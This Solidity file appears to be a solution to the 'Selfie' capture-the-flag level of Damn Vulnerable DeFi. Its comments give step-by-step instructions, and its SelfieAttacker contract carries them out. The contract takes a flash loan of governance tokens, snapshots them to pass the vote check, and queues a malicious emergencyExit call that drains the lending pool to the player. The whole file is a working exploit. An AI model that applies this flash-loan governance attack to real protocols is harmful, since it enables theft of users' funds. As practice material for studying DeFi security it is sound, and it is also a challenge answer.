// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

// 2000000000000000000000000 2 million token INITIAL SUPPLY of DVTS
// 1500000000000000000000000 1.5 million token IN POOL
// drain all tokens from the pool and transfer to the player address

// 1. take a flash Loan for a lot of tokens
// 2. When you receive the flashLoan we can take a snapshot to pass the hasEnoughVotes check when using the queueAction function in the governance
// 3. create a malicious data which will call emergencyExit with the players address as input parameter
// 4. queueAction of governance with the address of the flashLoanPool as target address, value of 0 and our malicious data field from step 3
// 5. approve the flashLoan pool for the amount we just loaned from the pool so it can retrieve its tokens with transferFrom
// 6. return the keccak256("ERC3156FlashBorrower.onFlashLoan") so the transactions passes in the flashLoanPool
// 7. Wait 2 days so the 2 days threshold for executing is exceeded
// 8. call executeAction with the correct actionId

contract SelfieAttacker is IERC3156FlashBorrower {
    ISimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot snapToken;
    address immutable player;
    uint256 private actionId;

    constructor(address _governance, address _pool, address _token) {
        governance = ISimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        snapToken = DamnValuableTokenSnapshot(_token);
        player = msg.sender;
    }

    function setAction() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(snapToken),
            pool.maxFlashLoan(address(snapToken)),
            "0x"
        );
    }

    function attack() external {
        governance.executeAction(actionId);
    }

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        snapToken.snapshot();
        // malicious call data which will transfer all funds to our player
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)", // will transfer balance to player
            player // input var for emergencyExit
        );
        actionId = governance.queueAction(address(pool), 0, data);
        snapToken.approve(address(pool), snapToken.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
